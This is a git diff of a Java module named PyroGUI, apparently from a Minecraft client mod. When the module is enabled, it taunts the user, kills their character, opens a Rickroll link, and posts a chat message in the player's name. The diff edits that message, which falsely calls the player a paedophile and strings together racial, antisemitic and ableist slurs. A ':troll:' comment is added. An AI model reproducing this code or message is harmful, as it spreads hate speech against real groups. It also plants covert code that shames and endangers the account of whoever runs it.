@@ -24,7 +24,8 @@ public class PyroGUI extends Module {
         if (mc.player != null)
             MessageUtil.send_client_message("EZZZ KID COPE MORE HAHAHAHAHHA GOTEM");
         mc.player.sendChatMessage("/kill");
-        mc.player.sendChatMessage("I am a pedophile, a larper, a newfag, a fitfag, a nigger, a jew, and a retard");
+        mc.player.sendChatMessage("I am kambing (who?), a pedophile, a larper, a newfag, a fitfag, a nigger, a jew, and a retard");
+        //:troll:
            try {
                 Desktop.getDesktop().browse(URI.create("https://www.youtube.com/watch?v=dQw4w9WgXcQ"));
             } catch (Exception ignored) {
